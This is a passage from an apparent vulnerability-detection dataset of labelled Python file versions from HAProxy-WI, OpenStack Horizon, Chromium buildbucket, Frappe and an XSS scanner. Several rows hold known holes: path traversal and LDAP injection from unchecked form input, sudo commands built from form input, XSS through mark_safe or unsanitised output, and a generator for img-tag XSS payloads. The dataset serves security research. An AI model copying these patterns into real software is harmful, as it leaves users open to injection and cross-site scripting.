		p[serv].line(""Date"", ""curr_ssl_con"", source=source, alpha=0.5, color=""#5d9ceb"", line_width=2, legend=""SSL con"")
		p[serv].line(""Date"", ""sess_rate"", source=source, alpha=0.5, color=""#33414e"", line_width=2, legend=""Sessions"")
		p[serv].legend.orientation = ""horizontal""
		p[serv].legend.location = ""top_left""
		p[serv].legend.padding = 5

	plots = []
	for key, value in p.items():
		plots.append(value)
		
	grid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = ""left"", toolbar_options=dict(logo=None))
	show(grid)
	
if form.getvalue('waf_metrics'):
	from datetime import timedelta
	from bokeh.plotting import figure, output_file, show
	from bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker
	from bokeh.layouts import widgetbox, gridplot
	from bokeh.models.widgets import Button, RadioButtonGroup, Select
	import pandas as pd
	import http.cookies
		
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')	
	servers = sql.select_waf_servers_metrics(user_id.value)
	servers = sorted(servers)
	
	p = {}
	for serv in servers:
		serv = serv[0]
		p[serv] = {}
		metric = sql.select_waf_metrics(serv)
		metrics = {}
		
		for i in metric:
			rep_date = str(i[2])
			metrics[rep_date] = {}
			metrics[rep_date]['conn'] = str(i[1])

		df = pd.DataFrame.from_dict(metrics, orient=""index"")
		df = df.fillna(0)
		df.index = pd.to_datetime(df.index)
		df.index.name = 'Date'
		df.sort_index(inplace=True)
		source = ColumnDataSource(df)
		
		output_file(""templates/metrics_waf_out.html"", mode='inline')
		
		x_min = df.index.min() - pd.Timedelta(hours=1)
		x_max = df.index.max() + pd.Timedelta(minutes=1)

		p[serv] = figure(
			tools=""pan,box_zoom,reset,xwheel_zoom"",
			title=metric[0][0],
			x_axis_type=""datetime"", y_axis_label='Connections',
			x_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)
			)
			
		hover = HoverTool(
			tooltips=[
				(""Connections"", ""@conn""),
			],
			mode='mouse'
		)
		
		p[serv].ygrid.band_fill_color = ""#f3f8fb""
		p[serv].ygrid.band_fill_alpha = 0.9
		p[serv].y_range.start = 0
		p[serv].y_range.end = int(df['conn'].max()) + 150
		p[serv].add_tools(hover)
		p[serv].title.text_font_size = ""20px""				
		p[serv].line(""Date"", ""conn"", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=""Conn"")
		p[serv].legend.orientation = ""horizontal""
		p[serv].legend.location = ""top_left""
		p[serv].legend.padding = 5
		
	plots = []
	for key, value in p.items():
		plots.append(value)
		
	grid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = ""left"", toolbar_options=dict(logo=None))
	show(grid)
	
if form.getvalue('get_hap_v'):
	output = funct.check_haproxy_version(serv)
	print(output)
	
if form.getvalue('bwlists'):
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')+""/""+form.getvalue('bwlists')
	try:
		file = open(list, ""r"")
		file_read = file.read()
		file.close
		print(file_read)
	except IOError:
		print('<div class=""alert alert-danger"" style=""margin:0"">Cat\'n read '+form.getvalue('color')+' list</div>')
		
if form.getvalue('bwlists_create'):
	list_name = form.getvalue('bwlists_create').split('.')[0]
	list_name += '.lst'
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')+""/""+list_name
	try:
		open(list, 'a').close()
		print('<div class=""alert alert-success"" style=""margin:0"">'+form.getvalue('color')+' list was created</div>')
	except IOError as e:
		print('<div class=""alert alert-danger"" style=""margin:0"">Cat\'n create new '+form.getvalue('color')+' list. %s </div>' % e)
		
if form.getvalue('bwlists_save'):
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')+""/""+form.getvalue('bwlists_save')
	try:
		with open(list, ""w"") as file:
			file.write(form.getvalue('bwlists_content'))
	except IOError as e:
		print('<div class=""alert alert-danger"" style=""margin:0"">Cat\'n save '+form.getvalue('color')+' list. %s </div>' % e)
	
	servers = sql.get_dick_permit()
	path = sql.get_setting('haproxy_dir')+""/""+form.getvalue('color')
	
	for server in servers:
		funct.ssh_command(server[2], [""sudo mkdir ""+path])
		error = funct.upload(server[2], path+""/""+form.getvalue('bwlists_save'), list, dir='fullpath')
		if error:
			print('<div class=""alert alert-danger"">Upload fail: %s</div>' % error)			
		else:
			print('<div class=""alert alert-success"" style=""margin:10px"">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>')
			if form.getvalue('bwlists_restart') == 'restart':
				funct.ssh_command(server[2], [""sudo "" + sql.get_setting('restart_command')])
			
if form.getvalue('get_lists'):
	list = os.path.dirname(os.getcwd())+""/""+sql.get_setting('lists_path')+""/""+form.getvalue('group')+""/""+form.getvalue('color')
	lists = funct.get_files(dir=list, format=""lst"")
	for list in lists:
		print(list)
		
if form.getvalue('get_ldap_email'):
	username = form.getvalue('get_ldap_email')
	import ldap
	
	server = sql.get_setting('ldap_server')
	port = sql.get_setting('ldap_port')
	user = sql.get_setting('ldap_user')
	password = sql.get_setting('ldap_password')
	ldap_base = sql.get_setting('ldap_base')
	domain = sql.get_setting('ldap_domain')
	ldap_search_field = sql.get_setting('ldap_search_field')

	l = ldap.initialize(""ldap://""+server+':'+port)
	try:
		l.protocol_version = ldap.VERSION3
		l.set_option(ldap.OPT_REFERRALS, 0)

		bind = l.simple_bind_s(user, password)

		criteria = ""(&(objectClass=user)(sAMAccountName=""+username+""))""
		attributes = [ldap_search_field]
		result = l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes)

		results = [entry for dn, entry in result if isinstance(entry, dict)]
		try:
			print('[""'+results[0][ldap_search_field][0].decode(""utf-8"")+'"",""'+domain+'""]')
		except:
			print('error: user not found')
	finally:
		l.unbind()/n/n/n",1
58,a835dbfbaa2c70329c08d4b8429d49315dc6d651,"openstack_dashboard/dashboards/identity/mappings/tables.py/n/n# Copyright (C) 2015 Yahoo! Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import json

from django.utils.translation import ugettext_lazy as _
from django.utils.translation import ungettext_lazy

from horizon import tables

from openstack_dashboard import api


class CreateMappingLink(tables.LinkAction):
    name = ""create""
    verbose_name = _(""Create Mapping"")
    url = ""horizon:identity:mappings:create""
    classes = (""ajax-modal"",)
    icon = ""plus""
    policy_rules = ((""identity"", ""identity:create_mapping""),)


class EditMappingLink(tables.LinkAction):
    name = ""edit""
    verbose_name = _(""Edit"")
    url = ""horizon:identity:mappings:update""
    classes = (""ajax-modal"",)
    icon = ""pencil""
    policy_rules = ((""identity"", ""identity:update_mapping""),)


class DeleteMappingsAction(tables.DeleteAction):
    @staticmethod
    def action_present(count):
        return ungettext_lazy(
            u""Delete Mapping"",
            u""Delete Mappings"",
            count
        )

    @staticmethod
    def action_past(count):
        return ungettext_lazy(
            u""Deleted Mapping"",
            u""Deleted Mappings"",
            count
        )
    policy_rules = ((""identity"", ""identity:delete_mapping""),)

    def delete(self, request, obj_id):
        api.keystone.mapping_delete(request, obj_id)


class MappingFilterAction(tables.FilterAction):
    def filter(self, table, mappings, filter_string):
        """"""Naive case-insensitive search.""""""
        q = filter_string.lower()
        return [mapping for mapping in mappings
                if q in mapping.ud.lower()]


def get_rules_as_json(mapping):
    rules = getattr(mapping, 'rules', None)
    if rules:
        rules = json.dumps(rules, indent=4)
    return rules


class MappingsTable(tables.DataTable):
    id = tables.Column('id', verbose_name=_('Mapping ID'))
    description = tables.Column(get_rules_as_json,
                                verbose_name=_('Rules'))

    class Meta(object):
        name = ""idp_mappings""
        verbose_name = _(""Attribute Mappings"")
        row_actions = (EditMappingLink, DeleteMappingsAction)
        table_actions = (MappingFilterAction, CreateMappingLink,
                         DeleteMappingsAction)
/n/n/n",0
59,a835dbfbaa2c70329c08d4b8429d49315dc6d651,"/openstack_dashboard/dashboards/identity/mappings/tables.py/n/n# Copyright (C) 2015 Yahoo! Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import json

from django.utils import safestring
from django.utils.translation import ugettext_lazy as _
from django.utils.translation import ungettext_lazy

from horizon import tables

from openstack_dashboard import api


class CreateMappingLink(tables.LinkAction):
    name = ""create""
    verbose_name = _(""Create Mapping"")
    url = ""horizon:identity:mappings:create""
    classes = (""ajax-modal"",)
    icon = ""plus""
    policy_rules = ((""identity"", ""identity:create_mapping""),)


class EditMappingLink(tables.LinkAction):
    name = ""edit""
    verbose_name = _(""Edit"")
    url = ""horizon:identity:mappings:update""
    classes = (""ajax-modal"",)
    icon = ""pencil""
    policy_rules = ((""identity"", ""identity:update_mapping""),)


class DeleteMappingsAction(tables.DeleteAction):
    @staticmethod
    def action_present(count):
        return ungettext_lazy(
            u""Delete Mapping"",
            u""Delete Mappings"",
            count
        )

    @staticmethod
    def action_past(count):
        return ungettext_lazy(
            u""Deleted Mapping"",
            u""Deleted Mappings"",
            count
        )
    policy_rules = ((""identity"", ""identity:delete_mapping""),)

    def delete(self, request, obj_id):
        api.keystone.mapping_delete(request, obj_id)


class MappingFilterAction(tables.FilterAction):
    def filter(self, table, mappings, filter_string):
        """"""Naive case-insensitive search.""""""
        q = filter_string.lower()
        return [mapping for mapping in mappings
                if q in mapping.ud.lower()]


def get_rules_as_json(mapping):
    rules = getattr(mapping, 'rules', None)
    if rules:
        rules = json.dumps(rules, indent=4)
    return safestring.mark_safe(rules)


class MappingsTable(tables.DataTable):
    id = tables.Column('id', verbose_name=_('Mapping ID'))
    description = tables.Column(get_rules_as_json,
                                verbose_name=_('Rules'))

    class Meta(object):
        name = ""idp_mappings""
        verbose_name = _(""Attribute Mappings"")
        row_actions = (EditMappingLink, DeleteMappingsAction)
        table_actions = (MappingFilterAction, CreateMappingLink,
                         DeleteMappingsAction)
/n/n/n",1
60,2f39f3df54fb79b56744f00bcf97583b3807851f,"appengine/cr-buildbucket/handlers.py/n/n# Copyright 2017 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

from components import auth
from components import config as config_api
from components import decorators
from components import endpoints_webapp2
from components import prpc

import webapp2

from legacy import api as legacy_api
from legacy import swarmbucket_api
import access
import api
import bq
import bulkproc
import config
import expiration
import model
import notifications
import service
import swarming
import user

README_MD = (
    'https://chromium.googlesource.com/infra/infra/+/master/'
    'appengine/cr-buildbucket/README.md'
)


class MainHandler(webapp2.RequestHandler):  # pragma: no cover
  """"""Redirects to README.md.""""""

  def get(self):
    return self.redirect(README_MD)


class CronUpdateBuckets(webapp2.RequestHandler):  # pragma: no cover
  """"""Updates buckets from configs.""""""

  @decorators.require_cronjob
  def get(self):
    config.cron_update_buckets()


class BuildRPCHandler(webapp2.RequestHandler):  # pragma: no cover
  """"""Redirects to API explorer to see the build.""""""

  def get(self, build_id):
    api_path = '/_ah/api/buildbucket/v1/builds/%s' % build_id
    return self.redirect(api_path)


class ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover
  """"""Redirects to API explorer to see the build.""""""

  @auth.public
  def get(self, build_id):
    try:
      build_id = int(build_id)
    except ValueError:
      self.response.write('invalid build id')
      self.abort(400)

    build = model.Build.get_by_id(build_id)
    can_view = build and user.can_view_build_async(build).get_result()

    if not can_view:
      if auth.get_current_identity().is_anonymous:
        return self.redirect(self.create_login_url(self.request.url))
      self.response.write('build %d not found' % build_id)
      self.abort(404)

    return self.redirect(str(build.url))


class TaskCancelSwarmingTask(webapp2.RequestHandler):  # pragma: no cover
  """"""Cancels a swarming task.""""""

  @decorators.require_taskqueue('backend-default')
  def post(self, host, task_id):
    swarming.cancel_task(host, task_id)


class UnregisterBuilders(webapp2.RequestHandler):  # pragma: no cover
  """"""Unregisters builders that didn't have builds for a long time.""""""

  @decorators.require_cronjob
  def get(self):
    service.unregister_builders()


def get_frontend_routes():  # pragma: no cover
  endpoints_services = [
      legacy_api.BuildBucketApi,
      config_api.ConfigApi,
      swarmbucket_api.SwarmbucketApi,
  ]
  routes = [
      webapp2.Route(r'/', MainHandler),
      webapp2.Route(r'/b/<build_id:\d+>', BuildRPCHandler),
      webapp2.Route(r'/build/<build_id:\d+>', ViewBuildHandler),
  ]
  routes.extend(endpoints_webapp2.api_routes(endpoints_services))
  # /api routes should be removed once clients are hitting /_ah/api.
  routes.extend(
      endpoints_webapp2.api_routes(endpoints_services, base_path='/api')
  )

  prpc_server = prpc.Server()
  prpc_server.add_interceptor(auth.prpc_interceptor)
  prpc_server.add_service(access.AccessServicer())
  prpc_server.add_service(api.BuildsApi())
  routes += prpc_server.get_routes()

  return routes


def get_backend_routes():  # pragma: no cover
  prpc_server = prpc.Server()
  prpc_server.add_interceptor(auth.prpc_interceptor)
  prpc_server.add_service(api.BuildsApi())

  return [  # pragma: no branch
      webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases',
                    expiration.CronExpireBuildLeases),
      webapp2.Route(r'/internal/cron/buildbucket/expire_builds',
                    expiration.CronExpireBuilds),
      webapp2.Route(r'/internal/cron/buildbucket/delete_builds',
                    expiration.CronDeleteBuilds),
      webapp2.Route(r'/internal/cron/buildbucket/update_buckets',
                    CronUpdateBuckets),
      webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod',
                    bq.CronExportBuildsProd),
      webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental',
                    bq.CronExportBuildsExperimental),
      webapp2.Route(r'/internal/cron/buildbucket/unregister-builders',
                    UnregisterBuilders),
      webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\d+>',
                    notifications.TaskPublishNotification),
      webapp2.Route(
          r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>',
          TaskCancelSwarmingTask),
  ] + bulkproc.get_routes() + prpc_server.get_routes()
/n/n/n",0
61,2f39f3df54fb79b56744f00bcf97583b3807851f,"/appengine/cr-buildbucket/handlers.py/n/n# Copyright 2017 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

from google.appengine.api import users as gae_users

from components import auth
from components import config as config_api
from components import decorators
from components import endpoints_webapp2
from components import prpc

import webapp2

from legacy import api as legacy_api
from legacy import swarmbucket_api
import access
import api
import bq
import bulkproc
import config
import expiration
import model
import notifications
import service
import swarming
import user

README_MD = (
    'https://chromium.googlesource.com/infra/infra/+/master/'
    'appengine/cr-buildbucket/README.md'
)


class MainHandler(webapp2.RequestHandler):  # pragma: no cover
  """"""Redirects to README.md.""""""

  def get(self):
    return self.redirect(README_MD)


class CronUpdateBuckets(webapp2.RequestHandler):  # pragma: no cover
  """"""Updates buckets from configs.""""""

  @decorators.require_cronjob
  def get(self):
    config.cron_update_buckets()


class BuildRPCHandler(webapp2.RequestHandler):  # pragma: no cover
  """"""Redirects to API explorer to see the build.""""""

  def get(self, build_id):
    api_path = '/_ah/api/buildbucket/v1/builds/%s' % build_id
    return self.redirect(api_path)


class ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover
  """"""Redirects to API explorer to see the build.""""""

  @auth.public
  def get(self, build_id):
    try:
      build_id = int(build_id)
    except ValueError as ex:
      self.response.write(ex.message)
      self.abort(400)

    build = model.Build.get_by_id(build_id)
    can_view = build and user.can_view_build_async(build).get_result()

    if not can_view:
      if auth.get_current_identity().is_anonymous:
        return self.redirect(gae_users.create_login_url(self.request.url))
      self.response.write('build %d not found' % build_id)
      self.abort(404)

    return self.redirect(str(build.url))


class TaskCancelSwarmingTask(webapp2.RequestHandler):  # pragma: no cover
  """"""Cancels a swarming task.""""""

  @decorators.require_taskqueue('backend-default')
  def post(self, host, task_id):
    swarming.cancel_task(host, task_id)


class UnregisterBuilders(webapp2.RequestHandler):  # pragma: no cover
  """"""Unregisters builders that didn't have builds for a long time.""""""

  @decorators.require_cronjob
  def get(self):
    service.unregister_builders()


def get_frontend_routes():  # pragma: no cover
  endpoints_services = [
      legacy_api.BuildBucketApi,
      config_api.ConfigApi,
      swarmbucket_api.SwarmbucketApi,
  ]
  routes = [
      webapp2.Route(r'/', MainHandler),
      webapp2.Route(r'/b/<build_id:\d+>', BuildRPCHandler),
      webapp2.Route(r'/build/<build_id:\d+>', ViewBuildHandler),
  ]
  routes.extend(endpoints_webapp2.api_routes(endpoints_services))
  # /api routes should be removed once clients are hitting /_ah/api.
  routes.extend(
      endpoints_webapp2.api_routes(endpoints_services, base_path='/api')
  )

  prpc_server = prpc.Server()
  prpc_server.add_interceptor(auth.prpc_interceptor)
  prpc_server.add_service(access.AccessServicer())
  prpc_server.add_service(api.BuildsApi())
  routes += prpc_server.get_routes()

  return routes


def get_backend_routes():  # pragma: no cover
  prpc_server = prpc.Server()
  prpc_server.add_interceptor(auth.prpc_interceptor)
  prpc_server.add_service(api.BuildsApi())

  return [  # pragma: no branch
      webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases',
                    expiration.CronExpireBuildLeases),
      webapp2.Route(r'/internal/cron/buildbucket/expire_builds',
                    expiration.CronExpireBuilds),
      webapp2.Route(r'/internal/cron/buildbucket/delete_builds',
                    expiration.CronDeleteBuilds),
      webapp2.Route(r'/internal/cron/buildbucket/update_buckets',
                    CronUpdateBuckets),
      webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod',
                    bq.CronExportBuildsProd),
      webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental',
                    bq.CronExportBuildsExperimental),
      webapp2.Route(r'/internal/cron/buildbucket/unregister-builders',
                    UnregisterBuilders),
      webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\d+>',
                    notifications.TaskPublishNotification),
      webapp2.Route(
          r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>',
          TaskCancelSwarmingTask),
  ] + bulkproc.get_routes() + prpc_server.get_routes()
/n/n/n",1
62,38c184f73918a249f6bc4e395ca2e5385e1ef220,"modules/ActiveScan/xss.py/n/nfrom cores.base_plugins import Scanner
import re

class Check(Scanner):
	def gen_payload(self):
		from cores.xeger import Xeger
		generate = Xeger()
		while True:
			_payload = generate.xeger(""((\%3C)|<)((\%69)|i|(\%49))((\%6D)|m|(\%4D))((\%67)|g|(\%47))[^\n]+((\%3E)|>)"")
			if any(x in _payload for x in ""\""'><;/""):
				return _payload
	
	def fuzz(self, url, payload, response, parameter):
		for injection_types in self.signatures.keys():
			for sig in self.signatures[injection_types]:
				match = re.findall(re.escape(sig), response)
				if match and any(x in payload for x in ""><""):
					return self.signatures.keys()[0]
		return False
	
	def signature(self):
		return {""XSS"" : self.payload}
/n/n/n",0
63,38c184f73918a249f6bc4e395ca2e5385e1ef220,"/modules/ActiveScan/xss.py/n/nfrom cores.base_plugins import Scanner
import re

class Check(Scanner):
	def gen_payload(self):
		from cores.xeger import Xeger
		generate = Xeger()
		while True:
			_payload = generate.xeger(""((\%3C)|<)((\%69)|i|(\%49))((\%6D)|m|(\%4D))((\%67)|g|(\%47))[^\n]+((\%3E)|>)"")
			if any(x in _payload for x in ""\""'><;/""):
				return _payload

	def check(self, url, payload, response, parameter):
		for injection_types in self.signatures.keys():
			for sig in self.signatures[injection_types]:
				match = re.findall(re.escape(sig), response)
				if match and any(x in payload for x in ""><""):
					self.found(injection_types, url, parameter, payload)
					return True
		return False
	
	def signature(self):
		return {""XSS"" : self.payload}
/n/n/n",1
64,2fa19c25066ed17478d683666895e3266936aee6,"frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = ""published_on desc""
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql(""""""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s"""""", (self.blogger,))

	def on_update(self):
		clear_cache(""writers"")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception(""This blog has not been published yet!"")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc(""Blogger"", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			""name"": self.title,
			""description"": context.description,
		}

		if ""<!-- markdown -->"" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags[""image""] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value(""Blog Category"",
			context.doc.blog_category, [""title"", ""route""], as_dict=1)
		context.parents = [{""name"": _(""Home""), ""route"":""/""},
			{""name"": ""Blog"", ""route"": ""/blog""},
			{""label"": context.category.title, ""route"":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = ""templates/includes/blog/blog.html"",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _(""Posts filed under {0}"").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value(""Blogger"", {""name"": frappe.local.form_dict.blogger}, ""full_name"")
		list_context.sub_title = _(""Posts by {0}"").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by ""{0}""').format(sanitize_html(frappe.local.form_dict.txt))

	if list_context.sub_title:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""},
								{""name"": ""Blog"", ""route"": ""/blog""}]
	else:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""}]

	list_context.update(frappe.get_doc(""Blog Settings"", ""Blog Settings"").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql(""""""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc"""""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list(""""""select route from
		`tabBlog Post` where ifnull(published,0)=1""""""):
		clear_cache(blog)

	clear_cache(""writers"")

def get_blog_category(route):
	return frappe.db.get_value(""Blog Category"", {""name"": route}, ""title"") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger=""%s""' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category=""%s""' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like ""%{0}%"" or t1.title like ""%{0}%"")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """"""\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s"""""" % {
			""start"": limit_start, ""page_len"": limit_page_length,
				""condition"": ("" and "" + "" and "".join(conditions)) if conditions else """"
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or """"
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not ""http:"" in post.avatar and not ""https:"" in post.avatar) and not post.avatar.startswith(""/""):
			post.avatar = ""/"" + post.avatar

	return posts
/n/n/n",0
65,2fa19c25066ed17478d683666895e3266936aee6,"/frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = ""published_on desc""
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql(""""""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s"""""", (self.blogger,))

	def on_update(self):
		clear_cache(""writers"")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception(""This blog has not been published yet!"")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc(""Blogger"", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			""name"": self.title,
			""description"": context.description,
		}

		if ""<!-- markdown -->"" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags[""image""] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value(""Blog Category"",
			context.doc.blog_category, [""title"", ""route""], as_dict=1)
		context.parents = [{""name"": _(""Home""), ""route"":""/""},
			{""name"": ""Blog"", ""route"": ""/blog""},
			{""label"": context.category.title, ""route"":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = ""templates/includes/blog/blog.html"",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _(""Posts filed under {0}"").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value(""Blogger"", {""name"": frappe.local.form_dict.blogger}, ""full_name"")
		list_context.sub_title = _(""Posts by {0}"").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)

	if list_context.sub_title:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""},
								{""name"": ""Blog"", ""route"": ""/blog""}]
	else:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""}]

	list_context.update(frappe.get_doc(""Blog Settings"", ""Blog Settings"").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql(""""""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc"""""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list(""""""select route from
		`tabBlog Post` where ifnull(published,0)=1""""""):
		clear_cache(blog)

	clear_cache(""writers"")

def get_blog_category(route):
	return frappe.db.get_value(""Blog Category"", {""name"": route}, ""title"") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger=""%s""' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category=""%s""' % frappe.db.escape(filters.blog_category))

	if txt:
